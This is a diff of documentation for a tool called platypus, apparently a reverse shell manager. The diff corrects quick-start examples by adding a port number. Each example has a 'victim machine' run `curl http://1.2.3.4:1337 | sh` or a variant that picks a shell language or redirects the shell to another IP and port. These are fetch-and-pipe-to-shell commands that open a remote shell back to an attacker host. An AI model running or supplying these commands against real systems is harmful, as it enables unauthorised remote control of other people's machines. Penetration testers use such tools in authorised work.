@@ -9,19 +9,19 @@ To archive this, all you need is to construct a URL that indicates the target.
 ### Quick start
 
 1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
-2. Execute `curl http://1.2.3.4 | sh` on the victim machine
+2. Execute `curl http://1.2.3.4:1337 | sh` on the victim machine
 
 ### Specifying language of reverse shell command (default: bash)
 
 1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
-2. Execute `curl http://1.2.3.4/python | sh` on the victim machine
+2. Execute `curl http://1.2.3.4:1337/python | sh` on the victim machine
 
 ### What if I want to pop up the reverse shell to another IP (5.6.7.8) and port (7331)?
 
 By default, the new reverse shell will be popped up to the server which the port which the HTTP request sent, but you can simply change the IP and port by following these steps:
 
 1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
-2. Execute `curl http://1.2.3.4/5.6.7.8/7331/python | sh` on the victim machine
+2. Execute `curl http://1.2.3.4:1337/5.6.7.8/7331/python | sh` on the victim machine
 
 ### How to add a new language
 
